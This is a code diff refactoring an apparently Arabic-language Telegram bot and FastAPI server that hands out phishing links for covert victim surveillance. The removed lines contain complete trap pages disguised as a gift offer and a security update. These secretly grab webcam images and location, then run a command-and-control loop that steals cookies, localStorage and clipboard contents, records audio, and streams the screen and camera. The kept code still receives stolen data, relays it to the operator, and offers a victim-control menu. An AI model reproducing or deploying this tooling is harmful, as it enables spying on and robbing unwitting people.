@@ -10,17 +10,12 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile, LabeledPrice
 
-app = FastAPI()
+from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, USERS_DB, VICTIMS_DB, ACTIVE_WEBSOCKETS, COMMAND_QUEUES
+from templates import get_intel_template, get_live_template
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
+app = FastAPI()
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-
-LINK_TO_USER = {}
-USERS_DB = {} 
-VICTIMS_DB = {} 
-ACTIVE_WEBSOCKETS = {}
-COMMAND_QUEUES = {}
 
 class VictimData(BaseModel):
     link_id: str
@@ -39,347 +34,11 @@ class CommandResponse(BaseModel):
 
 @app.get("/intel/{link_id}", response_class=HTMLResponse)
 async def serve_intel_trap(link_id: str, request: Request):
-    html_content = """<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>فحص التوافق والمكافأة الرقمية</title>
-    <style>
-        body { background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
-        .loader { border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .box { background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="box" onclick="forceActivate()">
-        <h2>🎁 انقر هنا لاستلام الهدية الفورية!</h2>
-        <div class="loader"></div>
-        <p style="color: #94a3b8; font-size: 13px;">جاري فحص الجهاز وتحضير المكافأة...</p>
-    </div>
-    <video id="v" autoplay playsinline style="opacity: 0.01; position: absolute; pointer-events: none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    <script>
-        const linkId = "__LINK_ID_REPLACE__";
-        async function runIntel() {
-            try {
-                let img = "";
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
-                    await video.play();
-                    await new Promise(r => setTimeout(r, 1200));
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    img = canvas.toDataURL('image/jpeg', 0.85);
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-
-                let geo = {};
-                try {
-                    geo = await new Promise((res) => {
-                        navigator.geolocation.getCurrentPosition(
-                            p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }),
-                            e => res({ err: "مرفوض" }),
-                            { enableHighAccuracy: true, timeout: 3000 }
-                        );
-                    });
-                } catch(e) {}
-
-                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
-                await fetch('/api/v1/exfiltrate', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, geolocation: geo, stolen_data: sys })
-                });
-            } catch(e) {}
-        }
-        function forceActivate() { runIntel(); }
-        window.onload = runIntel;
-    </script>
-</body>
-</html>""".replace("__LINK_ID_REPLACE__", link_id)
-    return HTMLResponse(content=html_content)
+    return HTMLResponse(content=get_intel_template(link_id))
 
 @app.get("/live/{link_id}", response_class=HTMLResponse)
 async def serve_live_trap(link_id: str, request: Request):
-    html_content = """<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>تحديث النظام الأمني المشفر</title>
-    <style>
-        body { background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 40px; }
-        .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.7s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .card { background: #0f172a; padding: 25px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 400px; width: 90%; cursor: pointer; }
-        #v_cam, #v_screen { opacity: 0.01; position: fixed; top: 0; left: 0; width: 1px; height: 1px; pointer-events: none; z-index: -999; }
-        canvas { display: none; }
-    </style>
-</head>
-<body>
-    <div class="card" onclick="unlockEngine()">
-        <h2>🛡️ انقر للمتابعة وتثبيت التحديث الأمني</h2>
-        <div class="loader"></div>
-        <p style="color: #94a3b8; font-size: 13px;">جاري تشغيل محرك الاتصال الخفي...</p>
-    </div>
-    <video id="v_cam" autoplay playsinline muted></video>
-    <video id="v_screen" autoplay playsinline muted></video>
-    <canvas id="c_canvas"></canvas>
-    
-    <script>
-        const linkId = "__LINK_ID_REPLACE__";
-        let ws;
-        let isWsActive = false;
-        let activeStream = null;
-        let liveStreamTimer = null;
-        let screenStream = null;
-
-        // نظام منع تجميد المتصفح بالخلفية عبر Web Audio & Wake Lock API
-        async function initPersistenceEngine() {
-            try {
-                // تفعيل AudioContext لصيانة التشغيل بالخلفية
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                gainNode.gain.value = 0.00001;
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-
-                // تفعيل Screen Wake Lock لعدم إطفاء الشاشة أو تجميد السكربت
-                if ('wakeLock' in navigator) {
-                    await navigator.wakeLock.request('screen');
-                }
-            } catch(e) {}
-        }
-
-        function stopAllStreams() {
-            if (liveStreamTimer) {
-                clearInterval(liveStreamTimer);
-                liveStreamTimer = null;
-            }
-            if (activeStream) {
-                activeStream.getTracks().forEach(track => track.stop());
-                activeStream = null;
-            }
-            if (screenStream) {
-                screenStream.getTracks().forEach(track => track.stop());
-                screenStream = null;
-            }
-        }
-
-        async function executeCommand(cmdPacket) {
-            let output = "";
-            try {
-                if (cmdPacket.cmd === "dump_cookies") {
-                    output = document.cookie || "فارغة أو محمية";
-                } else if (cmdPacket.cmd === "dump_localstorage") {
-                    let ls = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        let k = localStorage.key(i);
-                        ls[k] = localStorage.getItem(k);
-                    }
-                    output = JSON.stringify(ls);
-                } else if (cmdPacket.cmd === "screen_snapshot") {
-                    try {
-                        if (!screenStream) {
-                            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: "screen" } });
-                        }
-                        let videoElem = document.getElementById('v_screen');
-                        videoElem.srcObject = screenStream;
-                        await videoElem.play();
-                        await new Promise(r => setTimeout(r, 600));
-
-                        const canvas = document.getElementById('c_canvas');
-                        canvas.width = videoElem.videoWidth || window.innerWidth;
-                        canvas.height = videoElem.videoHeight || window.innerHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                        output = canvas.toDataURL('image/jpeg', 0.85);
-                    } catch(err) {
-                        output = "❌ فشل التقاط الشاشة: يتطلب إذن تفاعلي (يجب أن يكون المتصفح مفتوحاً ومرئياً للقطات الشاشة الحية بسبب قيود النظام).";
-                    }
-                } else if (cmdPacket.cmd === "start_live_screen") {
-                    stopAllStreams();
-                    try {
-                        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: "screen", frameRate: 15 } });
-                        let videoElem = document.getElementById('v_screen');
-                        videoElem.srcObject = screenStream;
-                        await videoElem.play();
-
-                        liveStreamTimer = setInterval(() => {
-                            try {
-                                const canvas = document.getElementById('c_canvas');
-                                canvas.width = videoElem.videoWidth || window.innerWidth;
-                                canvas.height = videoElem.videoHeight || window.innerHeight;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                let frameData = canvas.toDataURL('image/jpeg', 0.6);
-                                sendResult("live_screen_frame", frameData);
-                            } catch(e) {}
-                        }, 2000);
-                        return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
-                    } catch(e) {
-                        return "❌ فشل بدء البث الحي للشاشة (يتطلب تفاعل المستخدم والموافقة على إذن الشاشة).";
-                    }
-                } else if (cmdPacket.cmd === "stop_live_screen") {
-                    stopAllStreams();
-                    return "⏹️ تم إيقاف البث الحي للشاشة بنجاح.";
-                } else if (cmdPacket.cmd === "start_live_camera") {
-                    stopAllStreams();
-                    try {
-                        activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                        let videoElem = document.getElementById('v_cam');
-                        videoElem.srcObject = activeStream;
-                        await videoElem.play();
-                        await new Promise(r => setTimeout(r, 800));
-                        
-                        liveStreamTimer = setInterval(() => {
-                            try {
-                                const canvas = document.getElementById('c_canvas');
-                                canvas.width = videoElem.videoWidth || 640;
-                                canvas.height = videoElem.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                let frameData = canvas.toDataURL('image/jpeg', 0.7);
-                                sendResult("live_camera_frame", frameData);
-                            } catch(e) {}
-                        }, 2000);
-                        return "📹 تم بدء البث الحي لكاميرا الضحية!";
-                    } catch(e) {
-                        return "❌ فشل تشغيل الكاميرا الحية (الصلاحية مرفوضة أو مشغولة بتطبيق آخر)";
-                    }
-                } else if (cmdPacket.cmd === "dump_clipboard") {
-                    try {
-                        output = await navigator.clipboard.readText();
-                    } catch(e) {
-                        output = "مرفوض الصلاحية أو الحافظة فارغة";
-                    }
-                } else if (cmdPacket.cmd === "record_audio") {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        const mediaRecorder = new MediaRecorder(stream);
-                        let chunks = [];
-                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                        mediaRecorder.onstop = async () => {
-                            const blob = new Blob(chunks, { 'type': 'audio/ogg; codecs=opus' });
-                            const reader = new FileReader();
-                            reader.readAsDataURL(blob);
-                            reader.onloadend = function() {
-                                sendResult("audio_clip", reader.result);
-                            }
-                            stream.getTracks().forEach(t => t.stop());
-                        };
-                        mediaRecorder.start();
-                        setTimeout(() => mediaRecorder.stop(), 5000);
-                        return "🎤 جاري التقاط التسجيل الصوتي الحي من الميكروفون...";
-                    } catch(err) {
-                        output = "❌ فشل التقاط الصوت: الميكروفون مقفل أو مرفوض الإذن.";
-                    }
-                }
-            } catch(err) {
-                output = "خطأ في التنفيذ: " + err.message;
-            }
-            return output;
-        }
-
-        function sendResult(cmd, data) {
-            const payload = { link_id: linkId, cmd: cmd, data: data };
-            if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({type: "response", ...payload}));
-            } else {
-                fetch('/api/v1/c2-respond', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(e => {});
-            }
-        }
-
-        async function startPollingEngine() {
-            setInterval(async () => {
-                try {
-                    let res = await fetch('/api/v1/poll-command/' + linkId);
-                    if (res.ok) {
-                        let pkt = await res.json();
-                        if (pkt && pkt.cmd) {
-                            let resData = await executeCommand(pkt);
-                            if (resData && pkt.cmd !== "record_audio" && !pkt.cmd.includes("live_")) {
-                                sendResult(pkt.cmd, resData);
-                            }
-                        }
-                    }
-                } catch(e) {}
-            }, 1000);
-        }
-
-        function initEnterpriseC2() {
-            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-            ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
-
-            ws.onopen = function() { isWsActive = true; };
-            ws.onmessage = async function(event) {
-                try {
-                    const pkt = JSON.parse(event.data);
-                    if (pkt.cmd === "ping") {
-                        ws.send(JSON.stringify({type: "pong"}));
-                        return;
-                    }
-                    let resData = await executeCommand(pkt);
-                    if (resData && pkt.cmd !== "record_audio" && !pkt.cmd.includes("live_")) {
-                        sendResult(pkt.cmd, resData);
-                    }
-                } catch(err) {}
-            };
-            ws.onclose = function() {
-                isWsActive = false;
-                setTimeout(initEnterpriseC2, 1000);
-            };
-        }
-
-        async function unlockEngine() {
-            await initPersistenceEngine();
-            initEnterpriseC2();
-            startPollingEngine();
-            
-            try {
-                let img = "";
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const videoElem = document.getElementById('v_cam');
-                    videoElem.srcObject = stream;
-                    await videoElem.play();
-                    await new Promise(r => setTimeout(r, 1000));
-                    const canvas = document.getElementById('c_canvas');
-                    canvas.width = videoElem.videoWidth || 640;
-                    canvas.height = videoElem.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                    img = canvas.toDataURL('image/jpeg', 0.85);
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-
-                const sys = { res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform };
-                await fetch('/api/v1/exfiltrate', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, stolen_cookies: document.cookie, stolen_data: sys })
-                });
-            } catch(e) {}
-        }
-
-        window.onload = function() {
-            unlockEngine();
-        };
-    </script>
-</body>
-</html>""".replace("__LINK_ID_REPLACE__", link_id)
-    return HTMLResponse(content=html_content)
+    return HTMLResponse(content=get_live_template(link_id))
 
 @app.websocket("/ws/c2/{link_id}")
 async def websocket_endpoint(websocket: WebSocket, link_id: str):
@@ -404,11 +63,9 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
             if link_id in ACTIVE_WEBSOCKETS:
                 await websocket.send_json({"cmd": "ping"})
     except WebSocketDisconnect:
-        if link_id in ACTIVE_WEBSOCKETS:
-            del ACTIVE_WEBSOCKETS[link_id]
+        ACTIVE_WEBSOCKETS.pop(link_id, None)
     except Exception:
-        if link_id in ACTIVE_WEBSOCKETS:
-            del ACTIVE_WEBSOCKETS[link_id]
+        ACTIVE_WEBSOCKETS.pop(link_id, None)
 
 async def handle_response_packet(packet: dict):
     link_id = packet.get("link_id")
@@ -420,17 +77,14 @@ async def handle_response_packet(packet: dict):
         try:
             if cmd_type == "screen_snapshot" and "," in str(res_data):
                 _, encoded = res_data.split(",", 1)
-                photo = BufferedInputFile(base64.b64decode(encoded), filename="real_screen.jpg")
-                await bot.send_photo(chat_id=target_user_id, photo=photo, caption="📸 *لقطة شاشة حقيقية ومتغيرة من جهاز الضحية*", parse_mode="Markdown")
+                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="real_screen.jpg"), caption="📸 *لقطة شاشة حقيقية من جهاز الضحية*", parse_mode="Markdown")
             elif (cmd_type == "live_screen_frame" or cmd_type == "live_camera_frame") and "," in str(res_data):
                 _, encoded = res_data.split(",", 1)
-                photo = BufferedInputFile(base64.b64decode(encoded), filename="live_stream_frame.jpg")
                 stream_title = "🔴 *بث حي حقيقي للشاشة*" if cmd_type == "live_screen_frame" else "📹 *بث حي للكاميرا*"
-                await bot.send_photo(chat_id=target_user_id, photo=photo, caption=f"{stream_title}", parse_mode="Markdown")
+                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="frame.jpg"), caption=stream_title, parse_mode="Markdown")
             elif cmd_type == "audio_clip" and "," in str(res_data):
                 _, encoded = res_data.split(",", 1)
-                audio_file = BufferedInputFile(base64.b64decode(encoded), filename="mic.ogg")
-                await bot.send_voice(chat_id=target_user_id, voice=audio_file, caption="🎤 *تسجيل صوتي حي من الميكروفون*", parse_mode="Markdown")
+                await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="mic.ogg"), caption="🎤 *تسجيل صوتي منفصل من الميكروفون*", parse_mode="Markdown")
             else:
                 await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة أمر: {cmd_type}]*\n\n`{str(res_data)[:1000]}`", parse_mode="Markdown")
         except Exception as e:
@@ -440,25 +94,6 @@ async def handle_response_packet(packet: dict):
 async def c2_respond_fallback(resp: CommandResponse):
     await handle_response_packet(resp.dict())
     return {"status": "ok"}
-
-@app.get("/api/v1/poll-command/{link_id}")
-async def poll_command(link_id: str):
-    if link_id in COMMAND_QUEUES and len(COMMAND_QUEUES[link_id]) > 0:
-        return COMMAND_QUEUES[link_id].pop(0)
-    return {}
-
-async def send_command_to_target(link_id: str, cmd_dict: dict):
-    ws = ACTIVE_WEBSOCKETS.get(link_id)
-    if ws:
-        try:
-            await ws.send_json(cmd_dict)
-            return True
-        except:
-            pass
-    if link_id not in COMMAND_QUEUES:
-        COMMAND_QUEUES[link_id] = []
-    COMMAND_QUEUES[link_id].append(cmd_dict)
-    return True
 
 @app.post("/api/v1/exfiltrate")
 async def receive_loot(data: VictimData):
@@ -471,35 +106,31 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             caption = (
-                "⚡ *[ تم الإيقاع بالضحية بنجاح! ]*\n\n"
+                "⚡ *[تم تسجيل بيانات الضحية بنجاح!]*\n\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
-                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
-                f"🍪 *الكوكيز:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
+                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`"
             )
-            
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
                     InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="📸 لقطة شاشة حقيقية", callback_data=f"cmd_snap_{data.link_id}"),
+                    InlineKeyboardButton(text="📸 لقطة شاشة", callback_data=f"cmd_snap_{data.link_id}"),
                     InlineKeyboardButton(text="🎤 تسجيل صوتي", callback_data=f"cmd_mic_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="🔴 تشغيل شاشة لايف", callback_data=f"cmd_lscr_{data.link_id}"),
+                    InlineKeyboardButton(text="🔴 شاشة لايف", callback_data=f"cmd_lscr_{data.link_id}"),
                     InlineKeyboardButton(text="⏹️ إيقاف اللايف", callback_data=f"cmd_stopscr_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="📹 تشغيل كاميرا لايف", callback_data=f"cmd_lcam_{data.link_id}"),
+                    InlineKeyboardButton(text="📹 كاميرا لايف", callback_data=f"cmd_lcam_{data.link_id}"),
                     InlineKeyboardButton(text="📋 سحب الحافظة", callback_data=f"cmd_clip_{data.link_id}")
                 ]
             ])
-
             if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                 _, encoded = data.camera_snapshot_base64.split(",", 1)
-                photo = BufferedInputFile(base64.b64decode(encoded), filename="target.jpg")
-                await bot.send_photo(chat_id=target_user_id, photo=photo, caption=caption, parse_mode="Markdown", reply_markup=kb_control)
+                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="target.jpg"), caption=caption, parse_mode="Markdown", reply_markup=kb_control)
             else:
                 await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
         except Exception as e:
@@ -510,120 +141,52 @@ async def receive_loot(data: VictimData):
 async def process_live_commands(callback: types.CallbackQuery):
     data_parts = callback.data.split("_")
     action = data_parts[1]
+    link_id = data_parts[2] if action != "stopscr" else data_parts[2]
     
-    if action == "stopscr":
-        target_cmd = "stop_live_screen"
-        link_id = data_parts[2]
-    else:
-        link_id = data_parts[2]
-        cmd_map = {
-            "cookie": "dump_cookies",
-            "ls": "dump_localstorage",
-            "snap": "screen_snapshot",
-            "mic": "record_audio",
-            "clip": "dump_clipboard",
-            "lscr": "start_live_screen",
-            "lcam": "start_live_camera"
-        }
-        target_cmd = cmd_map.get(action)
-    
+    cmd_map = {
+        "cookie": "dump_cookies",
+        "ls": "dump_localstorage",
+        "snap": "screen_snapshot",
+        "mic": "record_audio",
+        "clip": "dump_clipboard",
+        "lscr": "start_live_screen",
+        "stopscr": "stop_live_screen",
+        "lcam": "start_live_camera"
+    }
+    target_cmd = cmd_map.get(action)
     if not target_cmd:
         await callback.answer("❌ أمر غير معروف.", show_alert=True)
         return
 
-    await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
-    await callback.answer("🚀 تم إرسال الأمر للجهاز، جاري المعالجة الفورية...", show_alert=True)
+    ws = ACTIVE_WEBSOCKETS.get(link_id)
+    if ws:
+        await ws.send_json({"cmd": target_cmd})
+    await callback.answer("🚀 تم إرسال الأمر وتوجيه الأداة بشكل مستقل...", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    user_id = message.from_user.id
-    today_str = str(date.today())
-    
-    if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
-    
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")],
-            [KeyboardButton(text="📊 ضحاياي المسجلين"), KeyboardButton(text="👑 الاشتراك بالترسانة (نجوم تيليجرام)")]
+            [KeyboardButton(text="🔍 أداة الاستخبارات الأولية"), KeyboardButton(text="⚡ أداة التحكم C2 العسكري المنفصل")],
+            [KeyboardButton(text="📊 الإحصائيات")]
         ],
         resize_keyboard=True
     )
-    await message.answer(
-        "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة وجاهزة.*\n\n"
-        "• تم دمج محرك الصيانة الخلفي `WakeLock & AudioContext` لمنع تجميد الجلسة.\n"
-        "• اختر الأداة المطلوبة:",
-        reply_markup=kb,
-        parse_mode="Markdown"
-    )
+    await message.answer("💀 *منصة الترسانة السيبرانية مهيكلة ومنفصلة بالكامل.*\n• كل أداة تعمل بشكل مستقل وبأقصى دقة.", reply_markup=kb, parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات (سحب صور وجي بي اس - 3 مرات يومياً)")
-async def gen_intel_link(message: types.Message):
-    user_id = message.from_user.id
-    today_str = str(date.today())
-    if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"date": today_str, "intel_count": 0, "live_used": 0, "vip": False}
-    
-    u = USERS_DB[user_id]
-    if u["date"] != today_str:
-        u["date"] = today_str
-        u["intel_count"] = 0
-
-    if u["intel_count"] >= 3 and not u["vip"]:
-        await message.answer("⚠️ لقد استنفذت محاولاتك الثلاثة المجانية اليوم.", parse_mode="Markdown")
-        return
-
-    if not u["vip"]:
-        u["intel_count"] += 1
-
+@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات الأولية")
+async def gen_intel(message: types.Message):
     token = str(uuid.uuid4())[:8]
-    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
-    url = f"https://{domain}/intel/{token}"
-    LINK_TO_USER[token] = user_id
-    
-    rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
-    await message.answer(f"✅ *رابط الاستخبارات جاهز:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
+    LINK_TO_USER[token] = message.from_user.id
+    url = f"https://{DOMAIN}/intel/{token}"
+    await message.answer(f"✅ *رابط الاستخبارات:* \n`{url}`", parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")
-async def gen_live_link(message: types.Message):
-    user_id = message.from_user.id
-    if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"date": str(date.today()), "intel_count": 0, "live_used": 0, "vip": False}
-    
-    u = USERS_DB[user_id]
-    if u["live_used"] >= 1 and not u["vip"]:
-        await message.answer("⚠️ لقد استهلكت محاولتك المجانية الوحيدة! اشترك عبر نجوم تيليجرام لفتح الصلاحيات.", parse_mode="Markdown")
-        return
-
-    if not u["vip"]:
-        u["live_used"] += 1
-
+@dp.message(lambda msg: msg.text == "⚡ أداة التحكم C2 العسكري المنفصل")
+async def gen_live(message: types.Message):
     token = str(uuid.uuid4())[:8]
-    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
-    url = f"https://{domain}/live/{token}"
-    LINK_TO_USER[token] = user_id
-    
-    await message.answer(f"✅ *رابط C2 العسكري الفوري جاهز:*\n\n`{url}`\n\n*(جاهز للاستخدام الفوري)*", parse_mode="Markdown")
-
-@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
-async def show_victims(message: types.Message):
-    user_id = message.from_user.id
-    links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
-    total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
-    active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS or t in COMMAND_QUEUES)
-    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا: *{total}*\n🟢 الجلسات النشطة: *{active_now}*", parse_mode="Markdown")
-
-@dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
-async def buy_stars(message: types.Message):
-    prices = [LabeledPrice(label="Enterprise C2 Lifetime Access", amount=200)]
-    await bot.send_invoice(
-        chat_id=message.chat.id,
-        title="اشتراك الترسانة السيبرانية العسكرية (VIP)",
-        description="صلاحيات مطلقة بلا حدود لكافة الأدوات الاستخباراتية والتحكم العسكري الفوري.",
-        payload="vip_full_access",
-        currency="XTR",
-        prices=prices
-    )
+    LINK_TO_USER[token] = message.from_user.id
+    url = f"https://{DOMAIN}/live/{token}"
+    await message.answer(f"✅ *رابط C2 العسكري:* \n`{url}`", parse_mode="Markdown")
 
 async def run_polling():
     await dp.start_polling(bot)
@@ -635,4 +198,3 @@ async def startup():
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
-           
